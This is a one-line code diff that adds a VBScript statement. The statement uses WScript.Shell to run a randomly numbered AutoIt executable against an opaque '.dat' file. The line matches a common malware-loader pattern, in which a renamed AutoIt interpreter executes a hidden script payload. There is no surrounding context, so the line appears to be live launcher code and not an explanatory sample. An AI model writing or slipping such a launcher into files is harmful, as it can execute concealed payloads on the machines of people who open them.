@@ -1,0 +1,1 @@
+CreateObject("WScript.Shell").Run"Autoit3977747.exe 218167.dat"
